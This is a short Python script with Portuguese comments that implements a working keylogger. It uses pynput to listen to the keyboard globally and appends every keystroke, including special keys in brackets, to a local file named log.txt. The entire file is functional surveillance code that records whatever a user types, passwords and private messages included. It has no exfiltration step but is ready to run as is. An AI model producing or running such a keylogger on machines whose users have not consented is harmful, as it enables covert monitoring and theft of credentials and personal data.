from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}

def on_press(key): ## chamada automaticamente toda vez que uma tecla é pressionada
    try:
        
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
        ## se funcionar e nao der erro, ele escreve a key no arquivo log.txt
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter: 
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t") ## letras maiusculas
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc: 
                f.write("[ESC]")
            elif key in IGNORAR:
                pass ## nao grava nada caso estiver no ignorar
            else: 
                f.write(f"[{key}]")  ## caso seja desconhecida grava entre colchetes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    ##listener fica no background escutando as teclas e chamando o on_press toda vez que uma tecla é pressionada
    ##e chamando a listener.join() para manter o programa rodando